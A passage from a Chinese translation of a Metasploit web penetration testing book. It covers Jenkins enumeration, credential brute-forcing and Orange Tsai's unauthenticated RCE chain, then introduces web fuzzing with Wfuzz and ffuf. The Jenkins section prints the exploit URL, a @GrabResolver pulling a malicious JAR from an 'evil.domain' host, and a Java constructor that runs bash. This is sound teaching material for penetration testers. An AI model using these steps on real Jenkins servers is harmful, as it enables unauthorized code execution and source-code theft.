# Metasploit Web 渗透测试实用指南（四）

> 原文：[`annas-archive.org/md5/53B22D5EEA1E9D6C0B08A2FDA60AB7A5`](https://annas-archive.org/md5/53B22D5EEA1E9D6C0B08A2FDA60AB7A5)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第十七章：技术平台上的渗透测试 - Jenkins

在之前的章节中，我们看了如何利用 JBoss 和 Apache Tomcat。在本章中，我们将看看 Jenkins。Jenkins 是一个流行的工具，用于自动化软件开发过程中的非人工部分。在**企业对消费者**（**B2C**）关系中，公司提供诸如电子支付、电子商务、在线手机和卫星充值计划等服务给消费者，开发人员承担着重要的工作。由于在分期和生产服务器上频繁更新，环境对开发人员来说变得复杂。为了更有效地处理软件更新并能够及时发布它们，公司将选择使用一个平台引擎来尝试帮助管道化更新并轻松管理它们。

Jenkins 是这样一个平台引擎。它处理需要在不同时间部署到不同服务器上的源代码的部署和管理。由于 Jenkins 在管理公司的源代码时处理敏感信息，因此它是那些专注于工业间谍活动的人的热门目标。一旦威胁行为者能够访问 Jenkins 平台，他们就可以访问组织提供的服务的源代码（蓝图）。

作为渗透测试人员，我们必须确保客户组织的实例（如 Jenkins）已经完全打补丁。在本章中，我们将探讨以下主题：

+   Jenkins 简介

+   Jenkins 术语

+   Jenkins 侦察和枚举

+   利用 Jenkins

让我们开始吧！

# 技术要求

以下是本章的技术要求：

+   Jenkins 实例：[`jenkins.io/download/`](https://jenkins.io/download/)

+   Metasploit 框架

# Jenkins 简介

Jenkins 是一个开源工具。它是使用 Java 构建的，可以通过插件实现持续集成。例如，如果我们想要集成 Git，我们需要安装 git 插件。Jenkins 支持数百种插件，几乎与每种工具兼容。它这样做是为了确保**持续集成**（**CI**）和**持续交付**（**CD**）。

以下是 Jenkins 的一些关键特性：

+   提供 CI 和 CD

+   基于插件的架构

+   可扩展

+   分布式

+   易于配置

# Jenkins 术语

在我们深入研究如何枚举和利用 Jenkins 之前，我们需要了解一些基本术语，这些术语可能会在本章的后面部分出现。

# Stapler 库

Stapler 是 Jenkins 使用的一个库，它允许对象自动映射到 URL。它解决了在复杂应用程序中映射相对 URL 的问题，例如**表达式语言**（**EL**）([`www-106.ibm.com/developerworks/java/library/j-jstl0211.html`](http://www-106.ibm.com/developerworks/java/library/j-jstl0211.html))。它接受一个对象和一个 URL，然后根据对象评估 URL。它重复这个过程，直到找到静态资源、视图（如 JSP、Jelly、Groovy 等）或操作方法。以下图表更详细地显示了这个过程：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/642f371b-7343-4276-b121-cd6780b082dd.png)

（来源：[`stapler.kohsuke.org/what-is.html`](http://stapler.kohsuke.org/what-is.html)）

如前图所示，根对象映射到 URL，而每个其他对象都映射为单独的路径，直到找到资源。

# URL 路由

Jenkins 使用 URL 路由来处理 URL 路径；让我们来看一下：

+   模型：

`getLog()`将遍历到`/log/`

`getJob("foo")`将被遍历为`/job/foo`

+   操作方法

`doArtifact(...) action in getJob("foo")`将变成`/job/foo/1/artifact`，其中 1 是动态获取器。

# Apache Groovy

Apache Groovy 是一种多功能的编程语言，支持静态类型和静态编译。用户在这里需要记住的关键点是 Groovy 支持运行时和编译时的元编程。

# 元编程

元编程是一种允许计算机程序将其他程序视为其输入数据的技术。因此，程序可以被设计为读取/写入/修改其他程序，甚至是自身。如果一个程序只是报告自身，这被称为**内省**，而如果程序修改自身，则被称为**反射**。许多语言支持元编程 - PHP、Python、Apache Groovy 和编译器是一些例子。

让我们尝试通过一个例子进一步理解：

```
#!/bin/sh
echo '#!/bin/sh' > program1

for i in $(sequence 500)

do

echo "echo $i" >> program1

done

chmod +x program
```

正如您所看到的，前面的程序创建了另一个程序`programs`，它打印数字`1-500`。

# 抽象语法树

**抽象语法树**（**AST**）是程序的结构和内容相关细节的表示。它不包括不必要的标点和分隔符。编译器使用 AST 进行解析、类型解析、流分析和代码生成。

# 管道

Jenkins 管道是一组一起工作并帮助进行持续交付的插件的组合。管道可以作为 JenkinsFile 的代码实现，并且可以使用**领域特定语言**（**DSL**）进行定义。Jenkins 中的管道是用 Groovy 构建的。

# Jenkins 侦察和枚举

对 Jenkins 进行枚举是渗透测试的一个非常重要的方面。在执行侦察和枚举时检索到的活动信息可以帮助渗透测试人员利用 Jenkins 实例。

有几种方法可以确定 Jenkins 的安装和版本检测过程。我们现在将介绍这些，然后讨论如何利用 Jenkins。

# 使用网站图标哈希检测 Jenkins

Jenkins 有一个非常独特的网站图标，当转换为哈希形式时，变成了`81586312`。这个哈希可以用来识别 Jenkins 安装；甚至可以在 Shodan 上用来识别运行 Jenkins 的系统。

以下截图显示了哈希值如何用于识别 Jenkins：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/0f86a715-c06d-4d3c-a260-533243fc15ca.png)

我们还可以使用不同的 Jenkins HTTP 响应头来找到 Jenkins 实例。例如，要找到特定版本的 Jenkins，我们可以使用`X-Jenkins`头，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/93e9f548-629d-4fa0-9217-6bb57a1bf218.png)

让我们看看其他 HTTP 响应头可以用来识别 Jenkins 实例。

# 使用 HTTP 响应头检测 Jenkins

检测 Jenkins 实例最常见的方法之一是分析 HTTP 响应头。Jenkins 将大量信息放入其响应头中，例如版本披露信息、**命令行接口**（**CLI**）端口、用户和组权限等，所有这些都可以用于进一步的利用。以下是 Jenkins 实例的响应头截图：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/984d8558-75f7-4827-b861-dec55222766c.png)

以下是一些可以用于检测 Jenkins 实例的 HTTP 服务器响应头：

+   `X-Hudson`

+   `X-Jenkins`

+   `X-Jenkins-Session`

+   `X-You-Are-Authenticated-As`

+   `X-You-Are-In-Group-Disabled`

+   `X-Required-Permission`

+   `X-Permission-Implied-By`

+   `X-Hudson-CLI-Port`

+   `X-Jenkins-CLI-Port`

+   `X-Jenkins-CLI2-Port`

+   `X-SSH-Endpoint`

+   `X-Hudson-JNLP-Port`

+   `X-Jenkins-JNLP-Port`

+   `X-Jenkins-JNLP-Host`

+   `X-Instance-Identity`

+   `X-Jenkins-Agent-Protocols`

现在我们已经学会了一些手动检测 Jenkins 的常见方法，让我们继续进行渗透测试的下一个阶段 - 枚举。

# 使用 Metasploit 进行 Jenkins 枚举

现在我们已经介绍了手动枚举 Jenkins 的方法，让我们继续看看 Metasploit 框架的辅助`jenkins_enum`，它可以进一步进行枚举。

Metasploit 模块还有一个辅助程序，使用与前一节描述的方法类似的方法来执行 recon。这包括查找响应头值，即`X-Jenkins`，以及关键字的 HTML 源。可以使用以下命令加载辅助程序：

```
use auxiliary/scanner/http/jenkins_enum
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/da68f422-f94b-41d7-a349-01a689bdeb27.png)

在上述截图中设置选项后，运行辅助程序将检测版本号，并执行基本检查：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/b480c4b8-93a6-4c17-b729-db556e6a772f.png)

现在，我们可以深入一点，检查辅助程序的源代码，以了解脚本到底在做什么。通过查看以下截图，我们可以看到脚本检查以下内容：

+   /view/All/newJobs：显示作业列表

+   `/asynchPeople`：显示用户列表

+   `/systemInfo`：打印系统信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/7db89125-63ea-45f8-9825-c54e6781c96c.png)

以下命令显示 Metasploit 中的另一个辅助程序，允许我们暴力破解 Jenkins 的凭据：

```
auxiliary/scanner/http/jenkins_login
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/08016e9d-8559-4ad5-9139-80efd0a3b52d.png)

在设置了所需的选项并运行模块之后，我们将看到辅助程序返回有效的凭据。这可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/fc73dd5e-f11e-4839-8bba-faaa47f39b70.png)

现在让我们在下一节中探索 Jenkins。

# 利用 Jenkins

一旦枚举完成，并且找到了一个有漏洞的 Jenkins 版本，我们就可以继续进行利用阶段。在本节中，我们将学习`@orangetsai`发现的各种利用方式，以及它们如何被链接在一起来在 Jenkins 服务器上执行系统命令。

首先，我们将看一下 2019 年最著名的两个利用，由`@orangetsai`（[`blog.orange.tw/`](https://blog.orange.tw/)）发现，利用了 Jenkins 并返回了一个 shell。这些利用后来被添加到 Metasploit 作为未经身份验证的 RCE。

# Jenkins ACL 绕过

在 Jenkins 的脚本控制台利用变得广为人知之后，很多人开始在全局安全配置设置中将匿名读取访问权限设置为**禁用**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/bd926542-db9b-401f-b9cc-e91dd476c493.png)

有了这个设置，匿名用户除了在以下截图中显示的特定白名单项目之外，将不再看到任何内容（这些项目在以下 URL 提供：[`github.com/jenkinsci/jenkins/blob/41a13dffc612ca3b5c48ab3710500562a3b40bf7/core/src/main/java/jenkins/model/Jenkins.java#L5258`](https://github.com/jenkinsci/jenkins/blob/41a13dffc612ca3b5c48ab3710500562a3b40bf7/core/src/main/java/jenkins/model/Jenkins.java#L5258)）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/dcbef755-cc87-49f7-9dd7-c3b166e1938d.png)

我们已经知道 Jenkins 是基于 Java 的，并且在 Java 中，一切都是`java.lang.Object`的子类。因此，所有对象都有`getClass()`，并且`getClass()`的名称符合命名约定规则。因此，绕过这个白名单的一种方法是使用白名单对象作为入口，然后跳转到其他对象。

Orange 发现调用这些对象（在此处列出）会导致 ACL 绕过，并且可以成功访问搜索方法：

```
jenkins.model.Jenkins.getSecurityRealm()
.getUser([username])
.getDescriptorByName([descriptor_name])
```

在上述对象中显示的路由机制映射在以下 URL 格式中：

```
http://jenkins/securityRealm/user/<username>/search/index/q=<search value>
```

从提供的 URL 中，我们可以看到除非我们登录，否则不允许任何操作：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/49e63cbb-37c0-4d3e-a2eb-8149b638fab2.png)

现在，让我们看看当我们使用 ACL 绕过时会发生什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/0be6ed36-35e4-4516-a0c3-63a0c3559755.png)

我们成功绕过了 ACL 并进行了搜索。

# 理解 Jenkins 未经身份验证的 RCE

将 ACL 绕过漏洞与沙盒绕过链接在一起，给我们**远程代码执行**（**RCE**）。Metasploit 已经有一个利用这些漏洞并执行我们的 shellcode 的模块。在了解利用的工作原理之前，让我们看看它如何使用：

1.  我们可以通过在 msfconsole 中使用以下命令加载利用模块：

```
use exploit/multi/http/jenkins_metaprogramming
```

1.  以下屏幕截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/d26775f7-8b3d-4292-91ab-baf68066f517.png)

1.  接下来，我们设置所需的选项并运行利用，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/5d654f41-951a-4dac-a8bb-07f8d898dfc4.png)

1.  现在我们有了一个反向 shell，让我们阅读利用的源代码并尝试理解它是如何工作的。通过查看源代码，我们可以看到利用中使用的各种 CVE，以及作者的详细信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/87ec3c85-0d1c-4ccc-a033-439673db3a2c.png)

1.  查看模块的源代码，我们可以看到模块正在使用`GET` HTTP 方法请求`/search/index`并带有`q=a`参数：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/e0ba3338-48b1-4a35-85e4-e794bc436d96.png)

正如我们所看到的，利用通过检查以下内容来确认应用程序是否正在运行 Jenkins：

+   调用搜索功能的 ACL 绕过

+   X-Jenkins 值的响应头

+   调用搜索 URL 后关键字管理员的 HTML 页面正文

在这里，我们可以看到与 Groovy 的`doCheckScriptCompile`方法有关的内容。`doCheckScriptCompile`是一个允许开发人员检查语法错误的方法。为了解析语法，使用了 AST 解析器（有关更多详细信息，请参见本章的*Jenkins 术语*部分）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/26e0ac8f-3aca-4867-9030-52c24e04a831.png)

为了能够成功实现 RCE，我们需要发送通过`doCheckScriptCompile()`时执行的代码。这就是元编程的作用。Groovy 对元编程很友好。

当我们查看 Groovy 参考手册时，我们会遇到`@groovy.transform.ASTTest`，它有以下描述：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/0639822c-f95e-4042-96d1-674ec5b3eca4.png)

这意味着当通过`@ASTTest`传递时，将执行以下代码：

```
@groovy.transform.ASTTest(value={
assert java.lang.Runtime.getRuntime().exec(" echo 'Hacked' ")
})
```

到目前为止，利用可以这样编写：

```
http://jenkins/org.jenkinsci.plugins.workflow.cps.cpsflowdefinition/checkScriptCompile?value=@groovy.transform.ASTTEST(value={echo%201}%0a%20class%20Person())
```

URL 正在调用 Jenkins 的`workflow-cps`插件，该插件具有`checkScriptCompile`方法。托管代码的 URL 是

[`github.com/jenkinsci/workflow-cps-plugin/blob/2.46.x/src/main/java/org/jenkinsci/plugins/workflow/cps/CpsFlowDefinition.java`](https://github.com/jenkinsci/workflow-cps-plugin/blob/2.46.x/src/main/java/org/jenkinsci/plugins/workflow/cps/CpsFlowDefinition.java) 可以如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/92459083-6566-4699-8312-47a5238659b6.png)

然而，这个版本的利用只有在 Jenkins 中不存在**Pipeline Shared Groovy Libraries Plugin**时才能工作。这就是为什么，如果我们进一步查看利用代码，我们将看到与最终载荷中提到的`@Grab`相关的内容，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/0b54ba3b-c835-4bc3-99f4-9920a7930eeb.png)

现在，我们需要了解`@Grab`是什么。根据 Groovy 的官方文档，Grape 是一个 JAR 依赖管理器，允许开发人员管理和添加 Maven 存储库依赖项到他们的类路径，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/8565ff3b-f819-47b5-b6d8-d965c29162f5.png)

因此，`@Grab`将从所述存储库导入依赖项并将其添加到代码中。现在，一个问题出现了：“如果存储库不在 Maven 上怎么办？”在我们的情况下，因为它在 shellcode 中，Grape 将允许我们指定 URL，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/8f39306c-6f4b-4973-9df3-cd971a0d1da7.png)

在这里，以下代码将从[`evil.domain/evil/jar/org.restlet/1/org.restlet-1.jar`](http://evil.domain/evil/jar/org.restlet/1/org.restlet-1.jar)下载 JAR 文件：

```
@GrabResolver(name='restlet', root='http://evil.domain/')
@Grab(group='evil.jar, module='org.restlet', version='1')
import org.restlet
```

现在我们已经从服务器下载了恶意的 JAR 文件，下一个任务是执行它。为此，我们需要深入研究 Groovy 核心的源代码，这是 Grape 实现的地方（[`github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/GrapeIvy.groovy`](https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/GrapeIvy.groovy)）。

我们可以使用一种方法来处理 ZIP（JAR）文件，并检查特定目录中的两种方法。请注意以下截图中显示的最后几行 - 有一个名为`processRunners()`的函数：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/4a8afec0-a923-46a6-aaf1-35ae68720053.png)

通过查看以下函数，我们可以看到正在调用`newInstance()`。这意味着可以调用一个构造函数：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/d232cc35-0555-4e5a-9dbb-574883056dba.png)

简而言之，如果我们创建一个恶意的 JAR 文件，并将一个类文件放在`META-INF/services/org.codehaus.groovy.plugins.Runners`文件夹中，我们就能够调用一个包含我们代码的构造函数，如下所示：

```
public class Exploit {
public Exploit(){
try {
String[] cmds = {"/bin/bash", "-c", "whoami"};
java.lang.Runtime.getRuntime().exec(cmds);
} catch (Exception e) { }
}
}
```

上述代码将导致代码执行！

因此，如果我们回到利用的源代码，如下图所示，我们应该能够完全理解它的工作原理：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/16c4f78f-0971-437e-a301-7a0c6fd89cdf.png)

`checkScriptCompile`用于传递程序的语法。`@Grabconfig`用于禁用被获取文件的校验和。`@GrabResolver`用于获取外部依赖（恶意的 JAR 文件）。`Import`用于执行包含 shellcode 的构造函数。

# 总结

在本章中，我们学习了 Jenkins 及其基本术语。我们介绍了如何手动检测 Jenkins 的安装，以及如何使用 Metasploit Framework 进行检测。然后，我们学习了如何利用 Jenkins，以及利用的原理。了解这些利用的原理对于希望帮助所在公司应用更好的补丁并让渗透测试人员开发更好的利用或绕过的人来说是很重要的。

我们的主要目标应该始终是尽可能多地了解技术。从渗透测试人员的角度来看，他们了解得越多，他们能够利用的机会就越大，而从蓝队/SOC 团队的角度来看，对他们安装的技术有更多的了解可以帮助他们防止对其进行攻击。

在下一章中，我们将研究如何利用应用逻辑中的漏洞。

# 问题

1.  在黑盒渗透测试中，我们如何识别 Jenkins 实例？

1.  还有其他方法可以识别 Jenkins 实例吗？

1.  我已经从 HTTP 头中识别出了 Jenkins 实例，但页面无法访问。我该如何使页面可访问？

1.  一旦我能够访问 Jenkins 面板，我可以做些什么？

# 进一步阅读

以下链接更详细地介绍了 Jenkins 的漏洞利用：

+   Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE: [`blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html`](https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html)

+   Jenkins Security Advisory 2019-01-08: [`jenkins.io/security/advisory/2019-01-08/#SECURITY-1266`](https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266)

+   使用 Grape 进行依赖管理： [`docs.groovy-lang.org/latest/html/documentation/grape.html`](http://docs.groovy-lang.org/latest/html/documentation/grape.html)


# 第十八章：逻辑漏洞猎杀

在这一部分，我们将专注于利用应用程序中存在的业务逻辑缺陷，涵盖深入的示例。我们还将介绍模糊测试 Web 应用程序的方法，以找到漏洞并撰写报告。

本节包括以下章节：

+   第十四章，*Web 应用程序模糊测试-逻辑漏洞猎杀*

+   第十五章，*撰写渗透测试报告*


# 第十九章：Web 应用程序模糊测试 - 逻辑漏洞挖掘

在之前的章节中，我们已经学习了 Metasploit 的基础知识，可以在 Web 应用程序渗透测试中使用的 Metasploit 模块，使用 Metasploit 模块进行侦察和枚举，Metasploit 支持的不同技术和不同内容管理系统（CMSes）的不同模块，以及不同的利用技术。在本章中，我们将学习 Web 应用程序渗透测试的另一个重要方面 - Web 应用程序模糊测试。

Web 应用程序模糊测试并不是一般渗透测试案例中的强制阶段。然而，它是发现逻辑漏洞的关键步骤。根据 Web 应用程序服务器对某些请求的响应方式，可以使用模糊器来了解服务器的行为，以发现测试人员未见的缺陷。Metasploit 配备了三个 Web 模糊器模块，可用于测试 Web 应用程序中表单和其他字段的内存溢出。在本章中，我们将学习以下主题来学习模糊测试：

+   什么是模糊测试？

+   模糊测试术语

+   模糊攻击类型

+   Web 应用程序模糊测试简介

+   识别 Web 应用程序攻击向量

+   场景

# 技术要求

以下是本章的技术要求：

+   Wfuzz: [`github.com/xmendez/wfuzz`](https://github.com/xmendez/wfuzz)

+   Ffuf: [`github.com/ffuf/ffuf`](https://github.com/ffuf/ffuf)

+   Burp Suite: [`portswigger.net/burp`](https://portswigger.net/burp)

# 什么是模糊测试？

模糊测试，也称为模糊测试，是一种使用畸形/半畸形数据以自动化方式发现实现错误的黑盒软件测试。模糊测试是由威斯康星大学麦迪逊分校的 Barton Miller 教授及其学生于 1989 年开发的（他们的持续工作可以在[`www.cs.wisc.edu/~bart/fuzz/`](http://www.cs.wisc.edu/~bart/fuzz/)找到）。在进行模糊测试时，观察应用程序/软件的响应，并根据其行为的变化（崩溃或挂起），发现实现错误。简而言之，模糊测试过程如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/8753a263-90ef-485f-b20f-913481827b94.png)

我们需要确定目标和输入向量（在系统应用程序的情况下）以及需要进行模糊处理的端点（在 Web 应用程序的情况下）。在生成适当的输入种子（随机模糊数据）之后，畸形/半畸形的模糊数据将被输入到模糊器进行测试。

与此同时，我们需要通过监控和分析服务器/应用程序响应（在 Web 应用程序模糊测试的情况下为 Web 服务器响应，在系统应用程序模糊测试的情况下为应用程序诊断信息/跟踪信息，其中包括 FTP 服务器、SSH 服务器和 SMTP 服务器）来了解应用程序在模糊测试期间的行为。为了更好地理解模糊测试，让我们首先学习一些在模糊测试中常用的术语。

# 模糊测试术语

为了更好地理解模糊测试和模糊测试技术，让我们先看一下本章中将帮助我们掌握模糊测试概念和技术的不同模糊测试术语：

+   **模糊器：** 模糊器是一种将畸形/半畸形数据注入到服务器/网络应用程序中并观察应用程序行为以检测错误的程序/工具。模糊器使用生成器生成的畸形/半畸形数据。

+   **生成器：** 生成器使用模糊向量和一些随机数据的组合。然后将生成的数据馈送给模糊器，模糊器将这些畸形数据注入到应用程序中。

+   **模糊向量：** 模糊向量是模糊器使用的已知危险值。通过观察应用程序的行为，模糊器可以注入不同的模糊向量。

+   **输入种子：**这些是模糊器用于测试的有效输入样本。输入种子可以是包含模糊器要使用的数据格式的任何测试文件。生成器将根据输入种子生成数据，然后由模糊器使用。如果选择输入种子小心翼翼，我们可以在应用程序中找到大量的错误。

+   **仪器：**这是一种技术，用于测量应用程序的性能和诊断信息，包括任何错误。在模糊处理期间，仪器技术将在运行时暂时控制被模糊处理的应用程序/软件，就像拦截器一样，以查找来自跟踪信息的错误。

现在我们已经学习了一些新的术语，让我们看看可以使用哪些攻击类型来执行模糊测试。

# 模糊攻击类型

模糊器通常会尝试使用数字（有符号/无符号整数或浮点数）、字符（URL 或命令行输入）、用户输入文本、纯二进制序列等进行攻击的组合。可以从这些类型生成一系列模糊向量。例如，对于整数，模糊向量可以是零、负值或非常大的整数值；对于字符，模糊向量可以是转义字符、Unicode 字符、URL 编码字符、特殊字符或所有字符的序列。生成模糊向量列表后，模糊器将使用该列表对应用程序进行模糊处理。

# 应用程序模糊处理

对于基于桌面的应用程序，模糊器可以对其界面（按钮序列的组合、文本输入等）、命令行选项（如果适用）以及应用程序提供的导入/导出功能进行模糊处理。

对于基于 Web 的应用程序，模糊器可以对其 URL、用户输入表单、HTTP 请求头、HTTP POST 数据、HTTP 协议和 HTTP 方法进行模糊处理。

# 协议模糊处理

协议模糊器将伪造网络数据包并将其发送到服务器。如果协议栈中存在错误，将使用协议模糊来揭示它。

# 文件格式模糊处理

文件格式模糊处理通常用于那些程序在文件中导入/导出数据流的情况。要执行文件格式模糊处理，您必须生成多个具有不同文件格式的输入种子，并将它们保存在单个文件中。然后，模糊器将使用保存的文件作为服务器/应用程序的输入，记录可能发生的任何崩溃。现在我们将进入下一节，该节将向我们介绍 Web 应用程序模糊处理。

# Web 应用程序模糊处理简介

现在我们对模糊概念、术语和攻击类型有了清晰的理解，让我们开始基于 Web 应用程序的模糊处理。如前所述，基于 Web 应用程序的模糊处理是通过使用 URL、表单、标头和方法作为主要模糊向量来完成的。在本章中，我们将使用以下工具对基于 HTTP 的 Web 应用程序进行模糊处理：**Wfuzz**、**Ffuf**和**Burp Suite**。在继续之前，让我们安装本节中概述的工具，以便查找逻辑错误。

# Fuzzer 安装（Wfuzz）

Wfuzz 是一个基于 Python 的 Web 应用程序模糊器，它使用替换技术来将命令中的**FUZZ**关键字替换为提供给模糊器的模糊向量。该模糊器可以在不同的 Web 应用程序组件（如参数、身份验证、表单、目录/文件和标头）中执行复杂的 Web 安全攻击。Wfuzz 还配备了各种模块，包括迭代器、编码器、有效载荷、打印机和脚本。根据 Web 应用程序的不同，我们可以使用这些模块来执行成功的模糊测试：

1.  我们可以通过克隆 GitHub 存储库来安装**Wfuzz**工具，如下面的屏幕截图所示：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/00825c4a-b2d7-4054-a19a-4f8b6994cc3a.png）

1.  在运行工具之前，我们需要通过执行`python setup.py install`命令来安装它。这将在系统上安装所有文件，如下截图所示：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/1492d0b0-63ec-4ada-9280-e72ec91f8832.png)

1.  要确认工具是否已成功安装，让我们执行`wfuzz -h`命令：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/581aa7f1-8303-4042-8dde-df6df3c07d25.png)

现在让我们安装本章中将使用的第二个工具**Fuzz Faster U Fool**（**ffuf**）。

# 模糊器安装（ffuf）

**Fuzz Faster U Fool**（**ffuf**）是用 Go 编写的 Web 应用程序模糊器，具有 Gobuster 和**Wfuzz**的功能。我们可以从[`github.com/ffuf/ffuf`](https://github.com/ffuf/ffuf)克隆 GitHub 存储库，也可以从[`github.com/ffuf/ffuf/releases`](https://github.com/ffuf/ffuf/releases)下载预编译版本。让我们按照以下步骤安装它：

1.  我们可以使用`git clone https://github.com/ffuf/ffuf`命令或`go get https://github.com/ffuf/ffuf`命令来克隆存储库。让我们克隆存储库：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/af630c71-8b5e-4211-9f37-0e92a8464fac.png)

1.  现在，通过执行`go build .`命令来安装它：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/e46d7e4e-5684-4d71-b910-443fe397ccab.png)

1.  成功构建后，我们可以看到在同一目录中创建了一个名为`ffuf`的编译程序。我们可以按照以下截图中显示的方式运行程序：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/cb00e1fb-fdd3-4205-9b0c-eb81fa9cbca2.png)

1.  本章的第三个和最后一个工具将是臭名昭著的 Burp Suite Intruder：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/df47d7d4-86be-4bda-9cb6-4a5dcc14185f.png)

现在我们已经安装了执行模糊测试所需的所有工具，让我们试着了解在执行对 Web 应用程序进行模糊测试时将使用的模糊测试输入和向量。

# 识别 Web 应用程序攻击向量

攻击向量是 Web 应用程序的区域/部分，模糊器可以在其中注入畸形/半畸形数据。对于 Web 应用程序，以下是我们可以执行模糊测试的部分：

+   HTTP 请求动词

+   HTTP 请求 URI

+   HTTP 请求头

+   HTTP `POST`数据

+   HTTP 协议的旧版本

让我们试着了解每个部分以及我们可以用于 Web 应用程序模糊测试的所有模糊向量。

# HTTP 请求动词

请求动词也称为请求方法，它们由 Web 应用程序客户端用于指示对服务器上给定资源执行的期望操作。所使用的每种方法取决于客户端从服务器获取的资源。一些最常见的 HTTP 动词是`GET`，`POST`，`OPTIONS`，`HEAD`，`PUT`，`DELETE`，`TRACE`，`PATCH`和`CONNECT`。

对 HTTP 请求方法进行模糊测试可以帮助我们识别基于模糊器提供的不同方法而发生的 Web 应用程序响应的变化。我们还可以识别 Web 应用程序服务器允许的方法，这可以用于检查一些攻击测试用例。

# 使用 Wfuzz 对 HTTP 方法/动词进行模糊测试

对 HTTP 方法进行模糊测试非常简单，同时也非常有帮助。让我们尝试使用**Wfuzz**在简单的 Web 应用程序上对 HTTP 动词进行模糊测试。可以通过以下步骤来执行 HTTP 请求方法的模糊测试：

1.  在终端中执行以下命令以开始使用**Wfuzz**：

```
wfuzz -z list,PUT-POST-HEAD-OPTIONS-TRACE-GET -X FUZZ <url>
```

1.  以下截图显示了前面命令的输出：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/1c9e8a86-a359-4122-a1e2-d74a3e45217d.png)

`-z`选项用于输入有效负载。在这种情况下，我们使用了一个常见的 HTTP 请求方法列表（`GET`，`POST`，`HEAD`，`OPTIONS`，`TRACE`和`PUT`）。

`-X`选项用于提供模糊器要使用的 HTTP 请求方法。如果未提供`-X`选项，模糊器将默认使用 HTTP `GET`请求方法进行模糊测试。

现在，让我们看看如何使用**ffuf**对 HTTP 动词进行模糊测试。

# 使用 ffuf 对 HTTP 方法/动词进行模糊测试

我们还可以使用**ffuf**来模糊请求头。

我们可以执行以下命令，使用单词列表来模糊测试请求头：

```
./ffuf -c -X FUZZ -w <http_methods_wordlist> -u <url>
```

以下屏幕截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/6f847355-66fa-4600-8ecd-1ecb67235780.png)

如前面的屏幕截图所示，模糊器找到了一些 Web 应用程序服务器可接受的 HTTP 方法。让我们尝试使用 Burp Suite 来模糊相同的情况。

注意：在**ffuf**中使用`-c`选项是为了给 HTTP 响应代码添加颜色。这有助于我们更快地识别隐藏的文件和目录。

